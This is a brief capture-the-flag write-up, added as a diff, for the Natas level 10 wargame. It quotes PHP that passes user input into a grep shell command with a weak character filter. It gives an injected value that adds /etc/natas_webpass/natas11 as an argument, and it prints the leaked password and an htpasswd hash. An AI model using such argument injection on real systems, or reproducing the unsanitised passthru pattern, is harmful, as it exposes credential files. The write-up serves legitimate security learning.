@@ -1,0 +1,31 @@
+Characaters filtering:
+
+Output:
+<pre>
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i $key dictionary.txt");
+    }
+}
+?>
+</pre>
+
+With the needle as:
+.* /etc/natas_webpass/natas11
+
+The command becomes
+"grep -i .* /etc/natas_webpass/natas11 dictionary.txt"
+Which greps for any characters in the password file and the dictionary.txt file.
+.htpasswd:natas10:$1$7OEbhNHs$sdiG/YBvDGZ4bcYJUoaJL1
+/etc/natas_webpass/natas11:SUIRtXqbB3tWzTOgTAX2t8UfMbYKrgp6
+dictionary.txt:African
+. . . 
